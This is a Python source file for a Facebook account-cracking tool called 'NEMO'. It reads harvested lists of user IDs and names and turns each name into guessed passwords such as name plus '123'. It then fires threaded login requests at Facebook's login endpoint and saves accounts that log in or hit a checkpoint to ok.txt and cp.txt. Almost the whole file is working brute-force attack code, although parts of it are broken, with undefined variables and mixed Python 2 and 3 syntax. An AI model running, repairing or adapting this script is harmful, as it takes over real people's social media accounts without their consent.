import os
import re
import sys
import bs4
import time
import json
import uuid
import random
import urllib
import hashlib
import datetime
import calendar
import requests
import ipaddress
import mechanize
import threading
from time import sleep
from datetime import date
from datetime import datetime
from bs4 import BeautifulSoup as parser
import itertools,hashlib,threading,getpass
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor


sys.getdefaultencoding()
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jala(ms):
        for sir in ms + "\n":
                sys.stdout.write(sir)
                sys.stdout.flush()
                time.sleep(0.0001)
def clear():
 os.system("clear")
def banner():
 jala ('''
\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m
            \033[1;92m •••••\033[1;97m\033[0m NEMO
\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m                              
''')
id = []
cp = []
ok = []
loop = 0
s = requests.Session()
rgb = random.choice(['\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0m'])
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ho = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ho, op, ta))
tgl = ("%s %s %s"%(ho, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 Instagram 138.0.0.28.117 Android (29/10; 440dpi; 1080x2210; Xiaomi; Mi 9T Pro; raphael; qcom; fr_FR; 210180522)'


def brute():
        raw_input('\nENTER to CRACK')
        try:
            path = r'/data/data/com.termux/files/home/fb'
            self.apk = random.choice(glob.glob(path + r'/*.txt'))
            self.id = open(self.apk).read().splitlines()
            print('\nFile: %s'%(self.apk))
        except:
            print('\nCOMPLETE')
            os.sys.exit()
        jalan;time.sleep(0.2)
    with ThreadPoolExecutor(max_workers=30) as NEMO:
        for omen in self.id:
            try:
                uid, name = omen.split('<=>')
                xz = name.split(' ')
                if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                    pwx = [name, xz[0]+"123", x+"1234", x+"12345"]
                else:
                    pwx = [name, x+"123"]
                NEMO.submit(crack, uid, pwx, "https://id-id.facebook.com")
            except:
                pass

    os.remove(self.apk);time.sleep(2)

def crack(uid, pwx, host, **kwargs):
	ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r┣[*❯  crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/index.php?next=https://id-id.facebook.com/profile.php", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/index.php?next=https://id-id.facebook.com/profile.php").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?login_attempt=1",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				wrt = '%s|%s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				wrt = '%s|%s' % (user,pw)
				cp.append(wrt)
				open('cp.txt', 'a').write('%s\n' % wrt)
				break
				continue

		loop+=1

if __name__ == "__main__":
	os.system('clear');print 
	brute()
	
